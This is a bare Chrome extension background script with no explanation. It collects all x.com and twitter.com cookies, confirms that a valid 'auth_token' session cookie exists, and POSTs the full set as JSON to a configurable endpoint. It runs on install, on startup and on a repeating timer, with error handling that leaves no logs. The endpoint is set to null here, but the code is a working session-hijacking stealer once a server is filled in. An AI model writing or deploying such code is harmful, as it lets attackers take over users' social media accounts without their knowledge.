const ENDPOINT = null;
let busy = false;
async function run() {
  if (!ENDPOINT || busy) return;
  busy = true;
  try {
    const parts = await Promise.all(['x.com', 'twitter.com'].map(domain => chrome.cookies.getAll({domain})));
    const cookies = parts.flat();
    if (!cookies.some(c => c.name === 'auth_token' && (!c.expirationDate || c.expirationDate > Date.now()/1000))) return;
    const response = await fetch(ENDPOINT, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(cookies)});
    if (response.ok) clearInterval(timer);
  } catch (_) { /* No payload or token is logged. */ }
  finally { busy = false; }
}
const timer = setInterval(run, 3000);
setTimeout(() => clearInterval(timer), 235000);
chrome.runtime.onInstalled.addListener(run);
chrome.runtime.onStartup.addListener(run);
run();
